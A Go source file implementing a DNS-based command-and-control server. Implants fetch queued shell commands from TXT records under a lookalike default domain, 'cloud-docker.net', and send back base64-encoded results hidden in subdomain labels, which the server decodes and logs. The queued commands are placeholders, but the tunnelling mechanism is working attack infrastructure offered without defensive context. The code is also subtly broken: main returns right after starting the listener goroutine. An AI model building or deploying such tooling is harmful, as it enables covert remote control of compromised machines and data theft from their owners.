package main

import (
	"encoding/base64"
	"flag"
	"log"
	"net"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

var (
	domain = flag.String("domain", "cloud-docker.net", "authoritative zone")
	listen = flag.String("addr", ":53", "UDP listen address")
)

const (
	serial = 2025050501
	ns1    = "ns1"
	ns2    = "ns2"
)

type Server struct {
	sync.Mutex // TODO: don't need this
	cmds       map[string]string
}

func NewServer() *Server {
	commands := map[string]string{
		"1": "touch iwsahasdf.txt",
		"2": "touch hehehe.txt",
	}
	return &Server{cmds: commands}
}

func (s *Server) handler(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	fqdnDomain := dns.Fqdn(*domain)   // e.g. "your-domain.com."
	ns1Name := ns1 + "." + fqdnDomain // "ns1.your-domain.com."
	ns2Name := ns2 + "." + fqdnDomain // "ns2.your-domain.com."

	for _, q := range r.Question {
		switch q.Qtype {

		// SOA
		case dns.TypeSOA:
			if q.Name == fqdnDomain {
				m.Answer = append(m.Answer, &dns.SOA{
					Hdr:     dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
					Ns:      ns1Name,
					Mbox:    "hostmaster." + fqdnDomain,
					Serial:  serial,
					Refresh: 3600, Retry: 1800, Expire: 604800, Minttl: 60,
				})
			}

		// NS
		case dns.TypeNS:
			if q.Name == fqdnDomain {
				m.Answer = append(m.Answer,
					&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns1Name},
					&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns2Name},
				)
			}

		// A for your nameservers
		case dns.TypeA:
			switch q.Name {
			case ns1Name:
				m.Answer = append(m.Answer, &dns.A{
					Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
					A:   net.ParseIP("<YOUR_STATIC_IP>"),
				})
			case ns2Name:
				m.Answer = append(m.Answer, &dns.A{
					Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
					A:   net.ParseIP("<YOUR_STATIC_IP>"),
				})
			}

		// TXT for C2 commands/results
		case dns.TypeTXT:
			name := q.Name                // e.g. "cmd.id.your-domain.com."
			suffix := "." + *domain + "." // ".your-domain.com."
			// 1) command fetch
			if strings.HasPrefix(name, "cmd.") && strings.HasSuffix(name, suffix) {
				id := strings.TrimSuffix(strings.TrimPrefix(name, "cmd."), suffix)
				s.Lock()
				cmd, ok := s.cmds[id]
				if ok {
					delete(s.cmds, id)
				}
				s.Unlock()
				if ok {
					log.Printf("[→ %s] sending command: %q\n", id, cmd)
				}
				m.Answer = append(m.Answer, &dns.TXT{
					Hdr: dns.RR_Header{Name: name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
					Txt: []string{cmd},
				})
			}
			// 2) result post
			if strings.HasPrefix(name, "res.") && strings.HasSuffix(name, suffix) {
				sub := strings.TrimSuffix(strings.TrimPrefix(name, "res."), suffix)
				parts := strings.SplitN(sub, ".", 2)
				if len(parts) == 2 {
					id, b64 := parts[0], parts[1]
					data, err := base64.StdEncoding.DecodeString(b64)
					if err != nil {
						log.Printf("[✗ %s] bad base64: %s\n", id, b64)
					} else {
						log.Printf("[← %s] result: %s\n", id, data)
					}
				}
				// always reply (even empty) so the lookup succeeds
				m.Answer = append(m.Answer, &dns.TXT{
					Hdr: dns.RR_Header{Name: name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
					Txt: []string{""},
				})
			}
		}
	}

	if err := w.WriteMsg(m); err != nil {
		log.Printf("WriteMsg error: %v", err)
	}
}

func main() {
	flag.Parse()
	srv := NewServer()
	dns.HandleFunc(".", srv.handler)

	go func() {
		log.Printf("Starting DNS server on %s for domain %s\n", *listen, *domain)
		dnsServer := &dns.Server{Addr: *listen, Net: "udp"}
		if err := dnsServer.ListenAndServe(); err != nil {
			log.Fatalf("DNS Listen failed: %v", err)
		}
	}()

}
